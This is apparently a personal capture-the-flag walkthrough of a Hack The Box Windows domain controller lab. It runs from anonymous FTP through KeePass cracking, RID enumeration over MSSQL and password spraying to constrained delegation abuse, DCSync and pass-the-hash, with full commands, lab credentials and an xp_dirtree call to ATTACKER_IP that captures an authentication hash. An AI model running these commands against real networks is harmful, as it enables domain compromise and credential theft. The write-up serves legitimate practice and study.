<div class="htb-box-info hard">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f5d41e2-980d-4e29-8e30-a1cca89993e1.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Hard</td></tr>
        <tr><td>Release:</td><td>17 Jul 2025</td></tr>
      </table>
    </div>
  </div>
</div>


# enumeration
```bash
nmap -p- --min-rate 1000 --open 10.129.234.50
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
50035/tcp open  unknown
55007/tcp open  unknown
64699/tcp open  unknown
64700/tcp open  unknown
64706/tcp open  unknown
64710/tcp open  unknown
64723/tcp open  unknown
64725/tcp open  unknown
```
> This was critical: I started scanning too earli so mssql service didnt start yet... So a lot of confusion happened...


so we have windows ad box. let's enum each port:
```bash
sudo nmap -v -sV -sC -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 10.129.234.50
```
we got:
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:                                  
|_  SYST: Windows_NT                          
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings:                        
|   DNSVersionBindReqTCP:                     
|     version                                 
|_    bind                                   
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server                            
|_http-server-header: Microsoft-IIS/10.0                                                                                      
| http-methods:                                                                                                               
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE         
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-10 04:49:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC                                                                           
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?                                                                                                                                                                                                                               
464/tcp   open  kpasswd5?                                                                                                     
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0         
636/tcp   open  tcpwrapped           
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped           
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-10T04:49:34+00:00; -1s from scanner time.
| rdp-ntlm-info:                  
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE                            
|   NetBIOS_Computer_Name: DC        
|   DNS_Domain_Name: redelegate.vl          
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348                       
|_  System_Time: 2026-10-10T04:49:26+00:00             
| ssl-cert: Subject: commonName=dc.redelegate.vl    
| Issuer: commonName=dc.redelegate.vl                      
| Public Key type: rsa                                        
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-09T04:44:50
| Not valid after:  2027-04-10T04:44:50                                                                                       
| MD5:     ed01 1055 2799 d12a 36dc f526 b099 19df          
| SHA-1:   32f7 0cf2 0234 4a79 5e9c 49f7 cb9e 765c bcfa e143
|_SHA-256: f710 b878 de8a 507b c7cd 5ed5 642d e62e 3cef 3953 e7a2 d49c c3f3 cc21 1529 6248
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.99%I=7%D=10/10%Time=6AC9C3D0%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x82\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-10-10T04:49:27
|_  start_date: N/A
```

add to `/etc/hosts` - `10.129.234.50 redelegate.vl dc.redelegate.vl dc`

nmap got anonymous access into ftp service:
![[Pasted image 20261010075234.png]]

so lets check that out:
![[Pasted image 20261010075354.png]]

download all with `mget *` and typing `y` key.

CyberAudit.txt
![[Pasted image 20261010075509.png]]

TrainingAgenda.txt
![[Pasted image 20261010075632.png]]

but the most interesting file here is .kdbx cause it's password manager. I'll try to crack it.

First convert it into hash format. so hashcat can crack it:
```bash
keepass2john Shared.kdbx > keepass.hash
```

lets try with rockyou.txt wordlist.
```bash
hashcat keepass.hash -m 13400 --username /usr/share/wordlists/rockyou.txt
```

In 5 mins it didn't crack using rockyou.txt wordlist so looking at traininagenda.txt i got idea to craft `SeasonYear!` password list

that didnt work too...

so i ll continue enumeration for now

port 80:
![[Pasted image 20261010081026.png]]

smb wont list shares...

rpc gives nothing...

ok i went back to .kdbx cracking... the problem was that I didn't include Fall as season... I just forgot that "Autumn" is also called "Fall"...
![[Pasted image 20261010100516.png]]

let's try to crack it now:
```bash
hashcat 10.129.70.236/keepass.hash -m 13400 seasons --username
```

and then show it:
```bash
hashcat 10.129.70.236/keepass.hash -m 13400 seasons --username --show
```

we got password: `Fall2024!`

dump .kdbx password manager:
```bash
echo 'Fall2024!' | keepassxc-cli export Shared.kdbx --format csv
```

we got a bunch of creds:
```bash
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"Shared/IT","FTP","FTPUser","SguPZBKdRyxWzvXRWy6U","","Deprecated","","0","2024-10-20T07:56:58Z","2024-10-20T07:56:20Z"
"Shared/IT","FS01 Admin","Administrator","Spdv41gg4BlBgSYIW1gF","","","","0","2024-10-20T07:57:21Z","2024-10-20T07:57:02Z"
"Shared/IT","WEB01","WordPress Panel","cn4KOEgsHqvKXPjEnSD9","","","","0","2024-10-20T08:00:25Z","2024-10-20T07:57:24Z"
"Shared/IT","SQL Guest Access","SQLGuest","zDPBpaF4FywlqIv11vii","","","","0","2024-10-20T08:27:09Z","2024-10-20T08:26:48Z"
"Shared/HelpDesk","KeyFob Combination","","22331144","","","","0","2024-10-20T12:12:32Z","2024-10-20T12:12:09Z"
"Shared/Finance","Timesheet Manager","Timesheet","hMFS4I0Kj8Rcd62vqi5X","","","","0","2024-10-20T12:14:18Z","2024-10-20T12:13:30Z"
"Shared/Finance","Payrol App","Payroll","cVkqz4bCM7kJRSNlgx2G","","","","0","2024-10-20T12:14:11Z","2024-10-20T12:13:50Z"
```

I took only main info. so we have this users and their password:
```
FTPUser - SguPZBKdRyxWzvXRWy6U  
Administrator - Spdv41gg4BlBgSYIW1gF  
WordPress Panel - cn4KOEgsHqvKXPjEnSD9  
SQLGuest - zDPBpaF4FywlqIv11vii  
KeyFob Combination - 22331144  
Timesheet - hMFS4I0Kj8Rcd62vqi5X  
Payroll - cVkqz4bCM7kJRSNlgx2G
```

then I tried all this to auth:
![[Pasted image 20261010101116.png]]

SQLGuest is valid for mssql with `--local-auth` flag.

lets dig into mssql more:
first connect
![[Pasted image 20261010102003.png]]

I dont have any perms to run code and there is no interesting tables. but i found linked server. but nothing on that too...
```bash
SQL (SQLGuest  guest@master)> enum_links
SRV_NAME                     SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE               SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------------------------   ----------------   -----------   --------------------------   ------------------   ------------   -------   
WIN-Q13O908QBPG\SQLEXPRESS   SQLNCLI            SQL Server    WIN-Q13O908QBPG\SQLEXPRESS   NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------
```

set up listner. wrote `EXEC master..xp_dirtree '\\ATTACKER_IP\share';` in mssqlclient command. got hash. tried to crack but no use...

idk what to do with mssql...

we have a bunch of passwords but no users...

We need to enum users. we can do it ( as i learnt ) using metasploit:
```bash
msfconsole
```
![[Pasted image 20261010104856.png]]

```bash
use auxiliary/admin/mssql
```
![[Pasted image 20261010105011.png]]

```
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```

set all needed options:
![[Pasted image 20261010105142.png]]

and then run.

metasploit failed to run... I tried to fix it but no use...

So we have to do it manually. I found this script:`
```bash
#!/bin/bash

check_rid() {
    SID_BASE="010500000000000515000000a185deefb22433798d8e847a"
    local RID=$1
    local HEX_RID=$(python -c "import struct; print(struct.pack('<I', ${RID}).hex())")
    local SID="${SID_BASE}${HEX_RID}"
    local RES=$(mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file <( echo "select SUSER_SNAME(0x${SID});") 2>&1 | sed -n '/^----/{n;p;}')

    if [[ "$(echo "$RES" | xargs)" != "NULL" ]]; then echo "${RID}: ${RES}"; fi
}

export -f check_rid 
seq 1000 1500 | xargs -P 48 -I{} bash -c 'check_rid $@' _ {}
```

but before this we need to find this base sid:
```sql
select DEFAULT_DOMAIN() as mydomain;
> REDELEGATE

select SUSER_SID('REDELEGATE\Domain Admins')
> b'010500000000000515000000a185deefb22433798d8e847a00020000'

select SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847aF4010000);
> WIN-Q13O908QBPG\Administrator
```

and now we can run it:
![[Pasted image 20261010112125.png]]

write usernames into file.
```bash
awk -F'\' '{print $2}' users.txt | grep -E '\.|_' > usernames.txt
```
![[Pasted image 20261010112609.png]]

then we need spray passwords:
```bash
netexec smb dc.redelegate.vl -u usernames2.txt -p seasons --continue-on-success
```

we got hit: 
```bash
 [+] REDELEGATE\Marie.Curie:Fall2024!
```

on smb shares noting unusuall..

we got access to ldap..

also on mssql...

first i wanna run rusthound:
```bash
rusthound-ce --domain redelegate.vl -f redelegate.vl -u 'Marie.Curie' -p 'Fall2024!' -c All -z
```

We have HELPDEST membership:
![[Pasted image 20261010115511.png]]

interesting group. We can change password for a bunch of users:
![[Pasted image 20261010115539.png]]

The most interesting user here is `Helen.Frost`:
![[Pasted image 20261010120214.png]]

He has winrm access and has `GenericAll` over computer FS01...
![[Pasted image 20261010120240.png]]

lets change password for helen.frost:
```bash
bloodyAD -u 'Marie.Curie' -p 'Fall2024!' --dc-ip 10.129.70.236 -d dc.redelegate.vl set password 'Helen.Frost' 'VeryStrongOne123!' 

[+] Password changed successfully!
```

check access:
```bash
netexec smb dc.redelegate.vl -u 'Helen.Frost' -p 'VeryStrongOne123!'
```
-> all good

winrm in and grab first flag:
![[Pasted image 20261010122948.png]]

I wanted to check mb I have something in mssql service:
```bash
mssqlclient.py 'redelegate.vl/sql_svc:VeryStrongOne123@10.129.70.236' -windows-auth
```
but nothing new was found...

helen.frost privs
![[Pasted image 20261010132358.png]]

good reference - https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html#abusing-unconstrained-delegation-with-an-attacker-created-computer

we cant create any new machine account so we have to use FS01$.
```bash
netexec ldap redelegate.vl -u 'Helen.Frost' -p 'VeryStrongOne123!' -M maq
```
-> 0.

Let's change password on that:
```bash
bloodyAD -u 'Helen.Frost' -p 'VeryStrongOne123!' --dc-ip 10.129.70.236 -d dc.redelegate.vl set password 'FS01$' 'Xanax1337!' 

[+] Password changed successfully!
```

I htough I could exploit unconstrained delegation. so this flag is for unconstrained delegation. It didn't work cause I can't create dns entries that will point to my ip and without that I wont get any ticket back to me...
```bash
bloodyAD -u 'Helen.Frost' -p 'VeryStrongOne123!' --dc-ip 10.129.70.236 -d dc.redelegate.vl add uac 'FS01$' -f TRUSTED_FOR_DELEGATION                           
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

So I swtiched to [constrained delegation](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html):

first give the flag that is required for this attack: ( I can do it because of privilege I have `SeEnableDelegationPrivilege` )
```bash
bloodyAD -u 'Helen.Frost' -p 'VeryStrongOne123!' --dc-ip 10.129.70.236 -d dc.redelegate.vl add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

then i need to add spn into `msDS-AllowedToDelegateTo` flag
```bash
bloodyAD -u 'Helen.Frost' -p 'VeryStrongOne123!' --dc-ip 10.129.70.236 -d dc.redelegate.vl set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
```

now we can request ticket for dc: ( I tried to impersonate Administrator directly but no use... )
```bash
getST.py -spn 'cifs/dc.redelegate.vl' -impersonate dc -dc-ip 10.129.70.236 'redelegate.vl/FS01$:Xanax1337!'
```

so now we need to export his ticket and run secretsdump to perform DCSync
```bash
impacket-secretsdump -k -no-pass dc.redelegate.vl
```

copy administrator hash and now we can winrm with pass the hash...
```bash
evil-winrm -i dc.redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
```

and that's all...

